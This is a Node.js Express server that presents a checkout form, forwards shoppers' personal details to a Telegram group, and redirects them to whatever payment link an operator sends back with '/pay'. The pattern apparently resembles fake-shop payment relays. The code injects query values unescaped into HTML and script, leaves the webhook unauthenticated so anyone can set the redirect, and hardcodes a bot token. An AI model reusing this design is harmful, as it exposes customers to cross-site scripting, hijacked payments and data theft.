require('dotenv').config();
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Telegram credentials
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8514021592:AAGb8cpda9C03BYreg6kVL5zvUMyAk-FGMM';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-5088156392';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;

// In-memory storage voor sessions
const pendingSessions = new Map();

// Test endpoint
app.get('/', (req, res) => {
  res.json({ 
    status: 'active',
    message: 'Telegram Checkout Gateway is running',
    timestamp: new Date().toISOString()
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'healthy' });
});

// Send message to Telegram
async function sendTelegramMessage(text) {
  try {
    const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    });
    return response.data;
  } catch (error) {
    console.error('Error sending Telegram message:', error.message);
    throw error;
  }
}

// Checkout pagina (Irish/English version)
app.get('/checkout', async (req, res) => {
  const { amount, currency, order_id, return_url, cart_items } = req.query;
  
  if (!amount || !currency) {
    return res.status(400).send('Missing required parameters');
  }

  let cartData = null;
  if (cart_items) {
    try {
      cartData = JSON.parse(decodeURIComponent(cart_items));
    } catch (e) {
      console.error('Error parsing cart_items:', e);
    }
  }

  const sessionId = Date.now().toString();

  res.send(`
    <html>
      <head>
        <title>Customer Details - €${amount}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
          * { 
            box-sizing: border-box;
            margin: 0;
            padding: 0;
          }
          body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #f7f7f7;
            padding: 20px;
          }
          .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            padding: 40px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          }
          h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #333;
          }
          .amount {
            font-size: 32px;
            font-weight: bold;
            color: #2c6ecb;
            margin-bottom: 30px;
          }
          .form-group {
            margin-bottom: 16px;
          }
          label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 6px;
            color: #333;
          }
          input {
            width: 100%;
            padding: 12px;
            border: 1px solid #d9d9d9;
            border-radius: 5px;
            font-size: 14px;
          }
          input:focus {
            outline: none;
            border-color: #2c6ecb;
            box-shadow: 0 0 0 3px rgba(44, 110, 203, 0.1);
          }
          .form-row {
            display: flex;
            gap: 12px;
          }
          .form-row .form-group {
            flex: 1;
          }
          .submit-button {
            width: 100%;
            padding: 16px;
            background: #2c6ecb;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
          }
          .submit-button:hover {
            background: #1f5bb5;
          }
          .submit-button:disabled {
            background: #d9d9d9;
            cursor: not-allowed;
          }
          .waiting {
            text-align: center;
            padding: 40px;
            display: none;
          }
          .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #2c6ecb;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          .waiting-text {
            font-size: 18px;
            color: #666;
            margin-top: 20px;
          }
          .error {
            background: #ffebee;
            border: 1px solid #f44336;
            color: #c62828;
            padding: 16px;
            border-radius: 5px;
            margin-top: 20px;
            display: none;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div id="form-container">
            <h1>📋 Customer Details</h1>
            <div class="amount">€${amount}</div>
            
            <div id="error-message" class="error"></div>
            
            <form id="customer-form">
              <div class="form-row">
                <div class="form-group">
                  <label for="firstName">First Name *</label>
                  <input type="text" id="firstName" placeholder="Sean" required>
                </div>
                <div class="form-group">
                  <label for="lastName">Last Name *</label>
                  <input type="text" id="lastName" placeholder="O'Brien" required>
                </div>
              </div>
              
              <div class="form-group">
                <label for="email">Email Address *</label>
                <input type="email" id="email" placeholder="sean@example.ie" required>
              </div>
              
              <div class="form-group">
                <label for="phone">Phone Number *</label>
                <input type="tel" id="phone" placeholder="+353 85 123 4567" required>
              </div>
              
              <div class="form-group">
                <label for="address">Address *</label>
                <input type="text" id="address" placeholder="12 O'Connell Street" required>
              </div>
              
              <div class="form-row">
                <div class="form-group">
                  <label for="postalCode">Eircode *</label>
                  <input type="text" id="postalCode" placeholder="D01 F5P2" required>
                </div>
                <div class="form-group">
                  <label for="city">City *</label>
                  <input type="text" id="city" placeholder="Dublin" required>
                </div>
              </div>
              
              <div class="form-group">
                <label for="country">Country *</label>
                <input type="text" id="country" value="Ireland" required>
              </div>
              
              <button type="submit" class="submit-button">
                Continue to Payment
              </button>
            </form>
          </div>

          <div id="waiting-container" class="waiting">
            <div class="spinner"></div>
            <div class="waiting-text">
              Please wait...<br>
              Processing your details
            </div>
          </div>
        </div>

        <script>
          const cartData = ${cartData ? JSON.stringify(cartData) : 'null'};
          const sessionId = '${sessionId}';
          let pollingInterval = null;

          document.getElementById('customer-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const customerData = {
              firstName: document.getElementById('firstName').value.trim(),
              lastName: document.getElementById('lastName').value.trim(),
              email: document.getElementById('email').value.trim(),
              phone: document.getElementById('phone').value.trim(),
              address: document.getElementById('address').value.trim(),
              postalCode: document.getElementById('postalCode').value.trim(),
              city: document.getElementById('city').value.trim(),
              country: document.getElementById('country').value.trim()
            };
            
            // Validate
            if (!customerData.firstName || !customerData.lastName || !customerData.email || 
                !customerData.phone || !customerData.address || !customerData.postalCode || 
                !customerData.city || !customerData.country) {
              document.getElementById('error-message').style.display = 'block';
              document.getElementById('error-message').innerHTML = '✗ Please fill in all required fields';
              return;
            }

            // Show waiting screen
            document.getElementById('form-container').style.display = 'none';
            document.getElementById('waiting-container').style.display = 'block';
            
            try {
              // Send customer data
              const response = await fetch('/api/submit-customer-info', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  sessionId: sessionId,
                  customerData: customerData,
                  cartData: cartData,
                  amount: '${amount}',
                  currency: '${currency}',
                  orderId: '${order_id || ''}',
                  returnUrl: '${return_url || ''}'
                })
              });
              
              const data = await response.json();
              
              if (data.status === 'success') {
                // Start polling for payment link
                startPolling();
              } else {
                throw new Error(data.message || 'Something went wrong');
              }
            } catch (error) {
              document.getElementById('form-container').style.display = 'block';
              document.getElementById('waiting-container').style.display = 'none';
              document.getElementById('error-message').style.display = 'block';
              document.getElementById('error-message').innerHTML = '✗ ' + error.message;
            }
          });

          function startPolling() {
            // Poll every 2 seconds for payment link
            pollingInterval = setInterval(async () => {
              try {
                const response = await fetch('/api/check-payment-link/' + sessionId);
                const data = await response.json();
                
                if (data.status === 'ready' && data.paymentLink) {
                  clearInterval(pollingInterval);
                  window.location.href = data.paymentLink;
                }
              } catch (error) {
                console.error('Polling error:', error);
              }
            }, 2000);

            // Stop polling after 10 minutes
            setTimeout(() => {
              if (pollingInterval) {
                clearInterval(pollingInterval);
                document.getElementById('waiting-container').innerHTML = 
                  '<p style="color: #c62828;">⏱️ Timeout. Please try again.</p>';
              }
            }, 600000);
          }
        </script>
      </body>
    </html>
  `);
});

// Submit customer info
app.post('/api/submit-customer-info', async (req, res) => {
  try {
    const { sessionId, customerData, cartData, amount, currency, orderId, returnUrl } = req.body;
    
    console.log('Customer info received:', customerData);
    
    // Store session
    pendingSessions.set(sessionId, {
      customerData,
      cartData,
      amount,
      currency,
      orderId,
      returnUrl,
      paymentLink: null,
      created_at: new Date()
    });
    
    // Build products list
    let productsText = '';
    if (cartData && cartData.items) {
      productsText = '\n\n<b>🛒 Products:</b>\n';
      cartData.items.forEach(item => {
        productsText += `• ${item.quantity}x ${item.title} - €${(item.price / 100).toFixed(2)}\n`;
      });
    }
    
    // Send to Telegram GROUP
    const message = `
<b>🔔 NEW ORDER</b>

<b>💰 Amount:</b> €${amount}
<b>📦 Order ID:</b> ${orderId || sessionId}

<b>👤 Customer Details:</b>
Name: ${customerData.firstName} ${customerData.lastName}
Email: ${customerData.email}
Phone: ${customerData.phone}
Address: ${customerData.address}
Eircode: ${customerData.postalCode}
City: ${customerData.city}
Country: ${customerData.country}${productsText}

<b>🔑 Session ID:</b> <code>${sessionId}</code>

<b>Send payment link:</b>
<code>/pay ${sessionId} [your-payment-link]</code>

Example:
<code>/pay ${sessionId} https://mollie.com/checkout/xyz123</code>
    `.trim();
    
    await sendTelegramMessage(message);
    
    res.json({
      status: 'success',
      message: 'Details submitted'
    });
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      status: 'error',
      message: error.message
    });
  }
});

// Check payment link (polling endpoint)
app.get('/api/check-payment-link/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = pendingSessions.get(sessionId);
  
  if (!session) {
    return res.json({ status: 'not_found' });
  }
  
  if (session.paymentLink) {
    return res.json({
      status: 'ready',
      paymentLink: session.paymentLink
    });
  }
  
  res.json({ status: 'waiting' });
});

// Telegram webhook
app.post('/webhook/telegram', async (req, res) => {
  try {
    const update = req.body;
    console.log('Telegram update:', JSON.stringify(update, null, 2));
    
    // Handle text messages
    if (update.message && update.message.text) {
      const text = update.message.text.trim();
      
      // Check if it's a /pay command
      if (text.startsWith('/pay ')) {
        const parts = text.split(' ');
        
        if (parts.length >= 3) {
          const sessionId = parts[1];
          const paymentLink = parts.slice(2).join(' ');
          
          const session = pendingSessions.get(sessionId);
          
          if (session) {
            // Store payment link
            session.paymentLink = paymentLink;
            pendingSessions.set(sessionId, session);
            
            await sendTelegramMessage(`✅ Payment link set for session ${sessionId}\n\nCustomer will be redirected to:\n${paymentLink}`);
          } else {
            await sendTelegramMessage(`❌ Session ${sessionId} not found or expired`);
          }
        } else {
          await sendTelegramMessage(`❌ Usage: /pay [session_id] [payment-link]`);
        }
      }
    }
    
    res.send('OK');
  } catch (error) {
    console.error('Webhook error:', error);
    res.send('OK');
  }
});

// Set webhook
app.get('/set-webhook', async (req, res) => {
  try {
    const webhookUrl = `${APP_URL}/webhook/telegram`;
    const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
      url: webhookUrl
    });
    
    res.json({
      status: 'success',
      message: 'Webhook set successfully',
      webhook_url: webhookUrl,
      telegram_response: response.data
    });
  } catch (error) {
    res.status(500).json({
      status: 'error',
      message: error.message
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 App URL: ${APP_URL}`);
  console.log(`🤖 Telegram Bot configured`);
  console.log(`💬 Group Chat ID: ${TELEGRAM_CHAT_ID}`);
  console.log('');
  console.log(`📝 Set webhook: ${APP_URL}/set-webhook`);
});
